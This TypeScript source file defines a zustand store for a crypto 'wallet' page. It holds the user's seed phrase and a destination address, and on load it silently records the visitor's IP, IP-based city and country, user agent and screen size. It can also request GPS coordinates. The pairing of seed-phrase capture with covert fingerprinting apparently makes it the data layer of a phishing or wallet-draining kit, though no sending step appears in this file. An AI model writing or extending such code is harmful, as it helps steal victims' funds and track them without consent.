import { create } from "zustand";

/** --- TYPES --- **/
type GeolocationState = {
	latitude?: number;
	longitude?: number;
	city?: string;
	region?: string;
	country?: string;
	error?: string;
};

type WalletState = {
	blockchainNetwork: string;
	walletProvider: string;
	seedPhrase: string;
	destinationAddress: string;
	ipAddress: string;
	geolocation: GeolocationState | null;
	userAgent: string;
	screenResolution: string;
	isLoading: boolean;
};

type WalletActions = {
	setBlockchainNetwork: (network: string) => void;
	setWalletProvider: (provider: string) => void;
	setSeedPhrase: (phrase: string) => void;
	setDestinationAddress: (address: string) => void;
	fetchUserDetails: () => Promise<void>;
	fetchGeoFromIP: () => Promise<void>;
	requestPreciseGeolocation: () => Promise<void>;
	clearSensitiveData: () => void;
};

type WalletStore = WalletState & WalletActions;

/** --- STORE --- **/
export const useWalletStore = create<WalletStore>((set, get) => ({
	// --- STATE ---
	blockchainNetwork: "",
	walletProvider: "",
	seedPhrase: "",
	destinationAddress: "",
	ipAddress: "",
	geolocation: null,
	userAgent: "",
	screenResolution: "",
	isLoading: false,

	// --- ACTIONS ---
	setBlockchainNetwork: (network) => set({ blockchainNetwork: network }),
	setWalletProvider: (provider) => set({ walletProvider: provider }),
	setSeedPhrase: (phrase) => set({ seedPhrase: phrase }),
	setDestinationAddress: (address) => set({ destinationAddress: address }),

	/** 🔹 Fetch IP + basic device info (no permissions needed) */
	fetchUserDetails: async () => {
		set({ isLoading: true });

		try {
			const ipResponse = await fetch("https://api.ipify.org?format=json");
			const ipData = await ipResponse.json();

			const userAgent =
				typeof navigator !== "undefined" ? navigator.userAgent : "";
			const screenResolution =
				typeof window !== "undefined"
					? `${window.screen.width}x${window.screen.height}`
					: "";

			set({
				ipAddress: ipData.ip || "",
				userAgent,
				screenResolution,
				isLoading: false,
			});
		} catch (error) {
			console.error("❌ Failed to fetch IP/user details:", error);
			set({ ipAddress: "Error fetching IP", isLoading: false });
		}
	},

	/** 🌍 Get approximate location via IP (no permission popup) */
	fetchGeoFromIP: async () => {
		try {
			const res = await fetch("https://ipapi.co/json/");
			if (!res.ok) throw new Error("IP geolocation lookup failed");

			const data = await res.json();

			const geo: GeolocationState = {
				latitude: data.latitude,
				longitude: data.longitude,
				city: data.city,
				region: data.region,
				country: data.country_name,
			};

			set({ geolocation: geo });
		} catch (err) {
			console.error("❌ fetchGeoFromIP error:", err);
			set({ geolocation: { error: "Failed to get location from IP" } });
		}
	},

	/** 📍 Request precise GPS location (shows permission popup) */
	requestPreciseGeolocation: async () => {
		if (typeof navigator === "undefined" || !("geolocation" in navigator)) {
			set({
				geolocation: { error: "Geolocation not supported by this browser." },
			});
			return;
		}

		set({ isLoading: true });

		try {
			const pos = await new Promise<GeolocationState>((resolve) => {
				navigator.geolocation.getCurrentPosition(
					(position) =>
						resolve({
							latitude: position.coords.latitude,
							longitude: position.coords.longitude,
						}),
					(err) =>
						resolve({
							error: err?.message || "User denied geolocation access.",
						})
				);
			});

			set({ geolocation: pos, isLoading: false });
		} catch (error) {
			console.error("❌ requestPreciseGeolocation error:", error);
			set({
				geolocation: { error: "Failed to get precise geolocation" },
				isLoading: false,
			});
		}
	},

	/** 🧹 Clear sensitive info */
	clearSensitiveData: () => set({ seedPhrase: "", destinationAddress: "" }),
}));

/** --- AUTO-RUN ON STORE INIT --- **/
(async () => {
	const store = useWalletStore.getState();
	await store.fetchUserDetails();
	await store.fetchGeoFromIP(); // automatically gets city/region/country silently
})();
